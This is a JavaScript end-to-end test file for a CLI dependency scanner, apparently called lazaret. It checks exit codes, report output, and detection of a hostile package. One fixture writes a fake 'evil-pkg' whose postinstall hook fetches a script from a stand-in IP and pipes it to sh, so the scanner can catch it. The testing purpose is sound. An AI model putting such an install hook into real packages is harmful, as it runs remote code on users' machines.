// End-to-end: the real CLI as a child process.
import { test } from "node:test";
import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import { mkdtempSync, mkdirSync, writeFileSync, readFileSync, rmSync } from "node:fs";
import { fileURLToPath } from "node:url";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { version } from "../src/index.js";

// fileURLToPath, not URL.pathname: on Windows the latter gives "/D:/..."
const BIN = fileURLToPath(new URL("../bin/lazaret.js", import.meta.url));
const run = (...args) => spawnSync(process.execPath, [BIN, ...args], { encoding: "utf8" });

test("--version", () => {
  const p = run("--version");
  assert.equal(p.status, 0);
  assert.match(p.stdout, new RegExp(version.replaceAll(".", "\\.")));
});

test("usage errors", () => {
  assert.equal(run().status, 1);
  assert.equal(run("bogus").status, 1);
  assert.equal(run("check", join(tmpdir(), "lazaret-no-such-dir")).status, 2);
});

test("clean project passes and writes the report", () => {
  const dir = mkdtempSync(join(tmpdir(), "lz-"));
  try {
    writeFileSync(join(dir, "app.js"), "export const add = (a, b) => a + b;\n");
    const p = run("check", dir, "--no-html", "--quiet");
    assert.equal(p.status, 0, p.stderr);
    const report = JSON.parse(readFileSync(join(dir, "lazaret-report.json"), "utf8"));
    assert.equal(Object.keys(report)[0], "generatedBy");
    assert.equal(report.pass, true);
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

test("hostile dependency install hook fails the scan", () => {
  const dir = mkdtempSync(join(tmpdir(), "lz-"));
  try {
    const dep = join(dir, "node_modules", "evil-pkg");
    mkdirSync(dep, { recursive: true });
    writeFileSync(join(dep, "package.json"), JSON.stringify({ name: "evil-pkg", scripts: {
      postinstall: "curl -s http://192.0.2.1/x | sh" } }, null, 2));
    writeFileSync(join(dir, "app.js"), "export const x = 1;\n");
    const p = run("check", dir, "--no-json", "--no-html", "--quiet");
    assert.equal(p.status, 1, p.stdout);
  } finally { rmSync(dir, { recursive: true, force: true }); }
});
